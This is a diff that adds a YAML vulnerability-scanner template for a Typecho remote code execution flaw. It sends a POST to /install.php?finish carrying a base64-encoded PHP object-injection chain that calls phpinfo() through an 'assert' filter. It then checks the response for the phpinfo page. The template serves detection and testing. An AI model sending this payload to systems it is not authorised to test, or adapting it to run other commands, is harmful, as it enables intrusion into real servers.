@@ -1,0 +1,19 @@
+name: poc-yaml-typecho-rce
+set:
+  url: request.url
+rules:
+  - method: POST
+    path: /install.php?finish
+    headers:
+      Referer: '{{url}}'
+    body: >-
+      __typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YToyOntzOjg6ImNhdGVnb3J5IjthOjE6e2k6MDtPOjQ6IlRlc3QiOjA6e319czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6OToicGhwaW5mbygpIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6ImFzc2VydCI7fX19fX1zOjY6InByZWZpeCI7czo4OiJ0eXBlY2hvXyI7fQ==
+    follow_redirects: false
+    expression: >
+      response.status == 200 && response.body.bcontains(b"<title>phpinfo()</title>")
+detail:
+  author: last0monster(https://github.com/last0monster)
+  links:
+    - https://www.freebuf.com/vuls/155753.html
+    - https://www.freebuf.com/vuls/152058.html
+    - https://github.com/typecho/typecho/releases/tag/v1.1-15.5.12-beta
